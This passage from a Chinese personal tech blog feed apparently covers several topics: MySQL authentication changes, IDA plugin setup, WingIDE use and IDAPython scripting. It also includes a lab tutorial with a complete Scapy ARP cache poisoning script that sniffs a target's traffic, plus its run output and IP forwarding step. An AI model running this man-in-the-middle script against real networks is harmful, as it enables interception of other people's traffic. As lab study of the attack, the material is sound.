class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br></pre></td></tr></table></figure><h4 id="3-2、修改验证方式"><a href="#3-2、修改验证方式" class="headerlink" title="3.2、修改验证方式"></a>3.2、修改验证方式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br><span class="line">use mysql;</span><br><span class="line">ALTER USER <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED WITH mysql_native_password BY <span class="string">&#x27;你的密码&#x27;</span>;</span><br></pre></td></tr></table></figure><h4 id="3-3、查看当前的密码验证方式"><a href="#3-3、查看当前的密码验证方式" class="headerlink" title="3.3、查看当前的密码验证方式"></a>3.3、查看当前的密码验证方式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; <span class="keyword">select</span> User,plugin from user <span class="built_in">where</span> User = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">+------+-----------------------+</span><br><span class="line">| User | plugin                |</span><br><span class="line">+------+-----------------------+</span><br><span class="line">| root | mysql_native_password |</span><br><span class="line">+------+-----------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpMyAdmin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用scapy进行arp缓存投毒</title>
      <link href="/2020/03/01/%E5%88%A9%E7%94%A8scapy%E8%BF%9B%E8%A1%8Carp%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/"/>
      <url>/2020/03/01/%E5%88%A9%E7%94%A8scapy%E8%BF%9B%E8%A1%8Carp%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/</url>
      
        <content type="html"><![CDATA[<h3 id="1、目标机和kali的网络信息"><a href="#1、目标机和kali的网络信息" class="headerlink" title="1、目标机和kali的网络信息"></a>1、目标机和kali的网络信息</h3><p>目标机ip信息：<br><img src="target.png" width="70%" height="70%"><br>目标机arp表信息<br><img src="arp.png" width="70%" height="70%"><br>kali ip信息<br><img src="kali.png" width="70%" height="70%"><br>kali arp表<br><img src="arpkali.png" width="70%" height="70%"></p><h3 id="2、编写python脚本进行arp投毒"><a href="#2、编写python脚本进行arp投毒" class="headerlink" title="2、编写python脚本进行arp投毒"></a>2、编写python脚本进行arp投毒</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># @File    : arper.py</span></span><br><span class="line"><span class="comment"># @Time    : 2/17/20 09:24</span></span><br><span class="line"><span class="comment"># @Author  : youyang</span></span><br><span class="line"><span class="comment"># @Site    : youyang.me</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_interface</span>():</span><br><span class="line">    <span class="keyword">import</span> platform</span><br><span class="line">    <span class="keyword">global</span> interface</span><br><span class="line">    sysstr = platform.system()</span><br><span class="line">    <span class="keyword">if</span> sysstr == <span class="string">&quot;Linux&quot;</span>:</span><br><span class="line">        interface = <span class="string">&quot;eth0&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> sysstr == <span class="string">&quot;Darwin&quot;</span>:</span><br><span class="line">        interface = <span class="string">&quot;en0&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        interface = <span class="string">&quot;Ethernet0&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[*] Setting up %s&quot;</span> % interface</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_mac</span>(<span class="params">ip_address</span>):</span><br><span class="line">    responses, unanswered = srp(Ether(dst=<span class="string">&#x27;ff:ff:ff:ff:ff:ff&#x27;</span>) / ARP(pdst=ip_address), timeout=<span class="number">2</span>, retry=<span class="number">10</span>)</span><br><span class="line">    <span class="comment"># 返回从响应数据中获取的MAC地址</span></span><br><span class="line">    <span class="keyword">for</span> s, r <span class="keyword">in</span> responses:</span><br><span class="line">        <span class="keyword">return</span> r[Ether].src</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poison_target</span>(<span class="params">gateway_ip, gateway_mac, target_ip, target_mac</span>):</span><br><span class="line">    poison_target = ARP()</span><br><span class="line">    poison_target.op = <span class="number">2</span></span><br><span class="line">    poison_target.psrc = gateway_ip</span><br><span class="line">    poison_target.pdst = target_ip</span><br><span class="line">    poison_target.hwdst = target_mac</span><br><span class="line"></span><br><span class="line">    poison_gateway = ARP()</span><br><span class="line">    poison_gateway.op = <span class="number">2</span></span><br><span class="line">    poison_gateway.psrc = target_ip</span><br><span class="line">    poison_gateway.pdst = gateway_ip</span><br><span class="line">    poison_gateway.hwdst = gateway_mac</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[*] Beginning the ARP poison. [CTRL-C to stop]&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            send(poison_target)</span><br><span class="line">            send(poison_gateway)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[*] ARP poison attack finished.&quot;</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restore_target</span>(<span class="params">gateway_ip, gateway_mac, target_ip, target_mac</span>):</span><br><span class="line">    <span class="comment"># 以下代码中调用send函数的方式稍有不同</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[*] Restoring target...&quot;</span></span><br><span class="line">    send(ARP(op=<span class="number">2</span>, psrc=gateway_ip, pdst=target_ip, hwdst=<span class="string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>, hwsrc=gateway_mac), count=<span class="number">5</span>)</span><br><span class="line">    send(ARP(op=<span class="number">2</span>, psrc=target_ip, pdst=gateway_ip, hwdst=<span class="string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>, hwsrc=target_mac), count=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发出退出信号到主线程</span></span><br><span class="line">    os.kill(os.getpid(), signal.SIGINT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_current_time</span>():</span><br><span class="line">    <span class="keyword">import</span> time</span><br><span class="line">    <span class="keyword">return</span> time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,time.localtime(time.time()))</span><br><span class="line"></span><br><span class="line">target_ip = <span class="string">&quot;172.16.244.128&quot;</span></span><br><span class="line">gateway_ip = <span class="string">&quot;172.16.244.2&quot;</span></span><br><span class="line">packet_count = <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置网络接口</span></span><br><span class="line">interface = <span class="string">&quot;&quot;</span></span><br><span class="line">set_interface()</span><br><span class="line">conf.iface = interface</span><br><span class="line">conf.verb = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获得网关和目标ip对应的mac</span></span><br><span class="line">gateway_mac = get_mac(gateway_ip)</span><br><span class="line"><span class="keyword">if</span> gateway_mac <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[!!!] Failed to get gateway MAC. Exiting.&quot;</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[*] Gateway %s is at %s&quot;</span> % (gateway_ip, gateway_mac)</span><br><span class="line"></span><br><span class="line">target_mac = get_mac(target_ip)</span><br><span class="line"><span class="keyword">if</span> target_mac <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[!!!] Failed to get target MAC. Exiting.&quot;</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[*] Target %s is at %s&quot;</span> % (target_ip, target_mac)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动arp投毒线程</span></span><br><span class="line">poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))</span><br><span class="line">poison_thread.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[*] Starting sniffer for %d packets&quot;</span> % packet_count</span><br><span class="line">    bpf_filter = <span class="string">&quot;ip host %s&quot;</span> % target_ip</span><br><span class="line">    packets = sniff(count=packet_count, <span class="built_in">filter</span>=bpf_filter, iface=interface)</span><br><span class="line">    <span class="comment"># 将捕获到的数据包输出到文件</span></span><br><span class="line">    wrpcap(<span class="string">&#x27;arper&#x27;</span>+get_current_time()+<span class="string">&#x27;pcap&#x27;</span>, packets)</span><br><span class="line">    <span class="comment"># 还原网络配置</span></span><br><span class="line">    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="comment"># 还原网络配置</span></span><br><span class="line">    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>执行脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Desktop$ sudo python2 arper.py </span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">[*] Setting up eth0</span><br><span class="line">[*] Gateway 172.16.244.2 is at 00:50:56:e0:90:ca</span><br><span class="line">[*] Target 172.16.244.128 is at 00:0c:29:29:31:67</span><br><span class="line">[*] Starting sniffer <span class="keyword">for</span> 1000 packets</span><br><span class="line">[*] Beginning the ARP poison. [CTRL-C to stop]</span><br><span class="line">[*] Restoring target...</span><br><span class="line">[*] Restoring target...</span><br></pre></td></tr></table></figure><h3 id="3、目标机被攻击时的arp表信息"><a href="#3、目标机被攻击时的arp表信息" class="headerlink" title="3、目标机被攻击时的arp表信息"></a>3、目标机被攻击时的arp表信息</h3><img src="arp2.png" width="70%" height="70%"><h3 id="4、在kali上流量转发"><a href="#4、在kali上流量转发" class="headerlink" title="4、在kali上流量转发"></a>4、在kali上流量转发</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo sysctl net.ipv4.ip_forward=1</span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">net.ipv4.ip_forward = 1</span><br><span class="line">kali@kali:~$ </span><br></pre></td></tr></table></figure><h3 id="5、目标机器访问网络"><a href="#5、目标机器访问网络" class="headerlink" title="5、目标机器访问网络"></a>5、目标机器访问网络</h3><h3 id="6、kali上数据包"><a href="#6、kali上数据包" class="headerlink" title="6、kali上数据包"></a>6、kali上数据包</h3><img src="pcap.png" width="70%" height="70%">如上图，绿色的为目标机器发送到kali的数据包（网关为172.16.244.139，即为kali本身），详见下图1，黑色的为kali转发到目标的数据包（网关为172.16.244.2，即为kali的网关），详见下图2.<img src="p1.png" width="70%" height="70%"><img src="p2.png" width="70%" height="70%">]]></content>
      
      
      <categories>
          
          <category> blackhat </category>
          
      </categories>
      
      
        <tags>
            
            <tag> arp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac下IDA 7.0 安装keypatch插件</title>
      <link href="/2019/12/24/mac%E4%B8%8BIDA-7-0-%E5%AE%89%E8%A3%85keypatch%E6%8F%92%E4%BB%B6/"/>
      <url>/2019/12/24/mac%E4%B8%8BIDA-7-0-%E5%AE%89%E8%A3%85keypatch%E6%8F%92%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h3 id="1、安装keystone-engine"><a href="#1、安装keystone-engine" class="headerlink" title="1、安装keystone-engine"></a>1、安装keystone-engine</h3><p>先是尝试使用“$ sudo pip install keystone-engine”安装，但是使用cmake编译（该pip命令会自动编译安装）的时候报如下错误：<br>The C compiler “&#x2F;Library&#x2F;Developer&#x2F;CommandLineTools&#x2F;usr&#x2F;bin&#x2F;cc” is not able to compile a simple test program<br>然后手动安装如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/fjh658/keystone-engine.git</span><br><span class="line"><span class="built_in">cd</span> keystone-engine</span><br><span class="line">git submodule update --init --recursive</span><br><span class="line">sudo python setup.py install --verbose</span><br></pre></td></tr></table></figure><p>可以看到可以看到，keystone_engine被成功安装在了下面目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">running install_data</span><br><span class="line">copying src/build/llvm/lib/libkeystone.dylib -&gt; /Library/Python/2.7/site-packages/keystone</span><br><span class="line">running install_egg_info</span><br><span class="line">Writing /Library/Python/2.7/site-packages/keystone_engine-0.9.1_3-py2.7.egg-info</span><br></pre></td></tr></table></figure><h3 id="2、安装keypatch"><a href="#2、安装keypatch" class="headerlink" title="2、安装keypatch"></a>2、安装keypatch</h3><p>链接“<a href="https://github.com/keystone-engine/keypatch%E2%80%9D%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%BD%93%E5%89%8D%E6%9C%80%E6%96%B0zip%E5%8C%85%EF%BC%88v2.2%EF%BC%89%E3%80%82">https://github.com/keystone-engine/keypatch”，下载当前最新zip包（v2.2）。</a><br>拷贝keypatch.py到“&#x2F;Applications&#x2F;IDA Pro 7.0&#x2F;ida.app&#x2F;Contents&#x2F;MacOS&#x2F;plugins”目录，重启IDA就可以了。</p><h3 id="3、结果"><a href="#3、结果" class="headerlink" title="3、结果"></a>3、结果</h3><img src="keypatch.png" width="90%" height="90%"><img src="keypatchv.png" width="50%" height="50%"><h3 id="4、参考"><a href="#4、参考" class="headerlink" title="4、参考"></a>4、参考</h3><p><a href="http://www.keystone-engine.org/keypatch/">http://www.keystone-engine.org/keypatch/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ida </tag>
            
            <tag> mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python命名规范</title>
      <link href="/2019/12/21/python%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83/"/>
      <url>/2019/12/21/python%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.jianshu.com/p/a793c0d960fe">https://www.jianshu.com/p/a793c0d960fe</a><br><a href="https://zh-google-styleguide.readthedocs.io/en/latest/google-python-styleguide/python_style_rules/">https://zh-google-styleguide.readthedocs.io/en/latest/google-python-styleguide/python_style_rules/</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wingIDE使用记录</title>
      <link href="/2019/12/19/wingIDE%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/12/19/wingIDE%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="1、快捷键"><a href="#1、快捷键" class="headerlink" title="1、快捷键"></a>1、快捷键</h3><p>注释&#x2F;取消注释    command+：</p>]]></content>
      
      
      
        <tags>
            
            <tag> wingIDE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wingIDE调试idapython脚本</title>
      <link href="/2019/12/18/wingIDE%E8%B0%83%E8%AF%95idapython%E8%84%9A%E6%9C%AC/"/>
      <url>/2019/12/18/wingIDE%E8%B0%83%E8%AF%95idapython%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>可以使用wingIDE作为外部调试器，调试idapython脚本。具体设置见wingIDE说明文档–<br>“Table of Contents &gt;&gt; How-Tos &gt;&gt; Unmaintained How-Tos &gt;&gt; Using Wing with IDA Python”</p><h3 id="1、配置wingIDE环境，下断点"><a href="#1、配置wingIDE环境，下断点" class="headerlink" title="1、配置wingIDE环境，下断点"></a>1、配置wingIDE环境，下断点</h3><p>根据说明配置好后，用wingIDE打开目标idapython脚本，并且在目标idapython文件中下好断点</p><h3 id="2、运行idapython脚本"><a href="#2、运行idapython脚本" class="headerlink" title="2、运行idapython脚本"></a>2、运行idapython脚本</h3><p>打开ida，加载分析好的idb文件，文件菜单，运行目标idapython脚本，则触发断点，开始调试</p><h3 id="3、自己的两点总结："><a href="#3、自己的两点总结：" class="headerlink" title="3、自己的两点总结："></a>3、自己的两点总结：</h3><ul><li>wingide是调试器，ida运行idapython脚本作为客户端，调试的时候ida处于挂起状态\<img src="wingide_ida.png" width="90%" height="90%">可以看到ida在调试过程中挂起了<img src="ida.png" width="90%" height="90%"></li><li>一次调试完成后，要重新运行ida，才可以进行第二次调试，否则第二次断点断不下来</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> idapython </tag>
            
            <tag> wingide </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idapython的编写</title>
      <link href="/2019/12/18/idapython%E7%9A%84%E7%BC%96%E5%86%99/"/>
      <url>/2019/12/18/idapython%E7%9A%84%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<p>IDA Pro是一款静态反汇编的利器，具有良好的交互性、可编程性、可扩展性及对多处理器的支持。<br>对于IDA Pro的可扩展性表现在两个方面，一是采用内置的脚本语言IDC写脚本；二是采用Hex-rays提供的SDK写插件Plug-in（具体表现为plw、p64插件或者IDAPython插件）。</p><blockquote><p>IDC可以快速解决一些简单的问题，但是对于复杂的问题，就有点力不从心了。IDA SDK包文档过少，而且在调试相关的API，BUG比较多，使用比较难受，相比于起来，IDAPython可以调用IDC和IDA SDK包的所有函数，而且文档资料丰富。</p></blockquote><p><strong>简单的任务交由脚本完成，复杂的任务则需要定制满足需求的插件</strong></p><h3 id="0、先介绍一下IDA插件历史："><a href="#0、先介绍一下IDA插件历史：" class="headerlink" title="0、先介绍一下IDA插件历史："></a>0、先介绍一下IDA插件历史：</h3><p>来自（<a href="https://reverseengineering.stackovernet.com/cn/q/3050%EF%BC%89">https://reverseengineering.stackovernet.com/cn/q/3050）</a></p><h4 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h4><p>In IDA’s documentation, there are references to modules named ida_*, as well as idc, idaapi and idautils. The former modules seem to be the lower level ones. Almost always it says that IDA Plugin SDK API wrapper: <some_module>.</p><p>I have a few specific questions about the documentation and IDAPython:</p><p>1.What is this IDA plugin SDK? Is it the C like API available in IDC?<br>2.Do the higher level API allow access to all the lower level functionalities?<br>3.What can’t I seem to load lower level modules? (When I try to import ida_lines, IDA says ImportError: No module named ida_lines)</p><h4 id="回答："><a href="#回答：" class="headerlink" title="回答："></a>回答：</h4><p>A bit of history: (aka an aging guy blabbering about)</p><p>In the old days, we didn’t have python in IDA and when an individual wanted to develop an IDA plugin he had to implement it in C and use the SDK available from hex-ray’s download center using credentials received when you purchase an IDA license. We did have, however, IDC. IDC is IDA’s old, proprietary and somewhat deprecated scripting language, this is not related to C however there is evident effort using a C-like syntax. It was commonly used in the past but IDAPython nearly replaced it completely. The only reason to see IDC now is for old code, that precedes IDAPython.</p><p>Since then, IDAPython was developed (originally as a plugin using the aforementioned SDK, and then adopted by hex-rays and made part of IDA). Up until the recent IDA 6.95, we only had a single module exposing all of IDA’s C SDK in python. That module was idaapi. idc is implementing higher level functions that were migrated from IDC into IDAPython. idautils implements some more high level functions, that weren’t there before. those are rough divisions, and not entirely accurate. The important point here is that there was a single (long) python file exposing all SDK functions (that are exposed to python using SWIG).</p><p>In IDA 6.95 we still have that, but it was also the first version to include multiple ida_* modules where are to replace the broad idaapi. idaapi is only included in 6.95 for backwards compatibility and should be expected to be dropped in IDA 7. Generally, the names of the modules (what follows the ida_ prefix) are the names of the header files in which those functions are defined. For example, ida_lines will expose functions defined in lines.h.</p><p><strong>Actual answers:</strong></p><p>1.The IDA plugin SDK is a collection of C header files and binary libraries that allow a third party develop IDA plugins using the provided API. It can be downloaded from the download center and it’s documentation is available here.<br>2.While the C SDK is pretty well documented, the IDAPython not so much. I often find browsing the SDK useful when developing IDAPython plugins, as functions are usually exposed to python but not documented or described as well as they are in the SDK. basically most of the functions correspond and you’ll find the same functions having the same name in both IDAPython and the SDK (as this is mostly automatically generated code by&#x2F;for SWIG).<br>3.First guess would be you’re using an older version of IDA, where ida_* modules don’t yet exist. generally, using idaapi instead of every other module will do just fine.<br>Developing for IDA:</p><p><strong>A person interested in developing for IDA has three options:</strong></p><p>1.Writing C code using the IDA SDK and compiling it, having a plw or a p64 binary as output.<br>2.Writing IDC code. This is a decent scripting language recembling a simplified C in syntax. output would be a text file.<br>3.Writing IDAPython code. This is mostly python using the additional modules available when running from within IDA, plus a simple IDA plugin interface required to register as a plugin.</p><h3 id="1、idapython模块简单介绍"><a href="#1、idapython模块简单介绍" class="headerlink" title="1、idapython模块简单介绍"></a>1、idapython模块简单介绍</h3><p>idapython的主要模块为“idaapi.py”、“idautils.py”、“idc.py”。</p><ul><li>idaapi.py:　　    负责访问核心IDA API。</li><li>idautils.py:     提供大量的使用函数。</li><li>idc.py:          负责提供IDC中所有函数的功能。<br>以上模块在ida运行时使用内部python插件运行(IDAPython脚本会自动导入idc和idautils模块,idaapi模块,需要显式手动导入)。<br>但是这几个模块在不使用ida上下文，单独编写idapython脚本时，是无法使用的，会提示找不到模块。</li></ul><h3 id="2、使用ide单独编辑idapython时，引入idaapi等模块的设置"><a href="#2、使用ide单独编辑idapython时，引入idaapi等模块的设置" class="headerlink" title="2、使用ide单独编辑idapython时，引入idaapi等模块的设置"></a>2、使用ide单独编辑idapython时，引入idaapi等模块的设置</h3><p>在ida里写python有两个难受的地方，一个是类型推断，一个是代码补全，所以我们选择使用ide。<br><strong>在ide中脚本中要显示导入用到的模块，如“idaapi.py”、“idautils.py”、“idc.py”等，否则ide不认识相关函数，无法提示补全</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> idautils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><h4 id="2-1、使用wingIDE，环境变量中加入idapython相关模块的路径"><a href="#2-1、使用wingIDE，环境变量中加入idapython相关模块的路径" class="headerlink" title="2.1、使用wingIDE，环境变量中加入idapython相关模块的路径"></a>2.1、使用wingIDE，环境变量中加入idapython相关模块的路径</h4><img src="idapython_modules.png" width="90%" height="90%"><h4 id="2-2、使用pycharm，环境变量中加入idapython相关模块的路径"><a href="#2-2、使用pycharm，环境变量中加入idapython相关模块的路径" class="headerlink" title="2.2、使用pycharm，环境变量中加入idapython相关模块的路径"></a>2.2、使用pycharm，环境变量中加入idapython相关模块的路径</h4><p>Preference&#x2F;Settings – Project – Project Interpreter – Show All – Show paths for the selected interpreter<br><img src="python27_module.png" width="90%" height="90%"></p><h3 id="3、脚本"><a href="#3、脚本" class="headerlink" title="3、脚本"></a>3、脚本</h3><p>基本的思想是 建立一个FuncPath类，该类从DBG_Hooks类继承而来，包含了调试器的钩子和一些和调试相关的功能。<br>你可以重写它的相关函数。然后建立一个钩子类对象，获取光标所在位置，枚举每一个函数，然后在函数上下断点，并设置属性为跟踪。<br>这样就可以打印出光标开始之后执行的所有函数。</p><blockquote><p><font color=red size=3 face="华文中宋">也可以以插件的形式重写如下脚本，需要注意的是，在IDA的插件目录，所有python插件脚本的”插件继承类”的类名不能重复，否则重复类名的插件在IDA中加载不出来</font></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FuncPath</span>(<span class="title class_ inherited__">DBG_Hooks</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Our breakpoint handler</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dbg_bpt</span>(<span class="params">self, tid, ea</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[*] Hit: 0x%08x&quot;</span> % ea</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add our function coverage debugger hook</span></span><br><span class="line">debugger = FuncPath ()</span><br><span class="line">debugger.hook()</span><br><span class="line"></span><br><span class="line">current_addr = ScreenEA()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find all functions and add breakpoints</span></span><br><span class="line"><span class="keyword">for</span> function <span class="keyword">in</span> Functions(SegStart( current_addr ), SegEnd( current_addr )):</span><br><span class="line">    AddBpt( function )</span><br><span class="line">    SetBptAttr( function, BPTATTR_FLAGS, BPT_ENABLED|BPT_TRACE)<span class="comment">#设置断点的属性为跟踪</span></span><br><span class="line"></span><br><span class="line">num_breakpoints = GetBptQty()</span><br><span class="line"></span><br><span class="line"><span 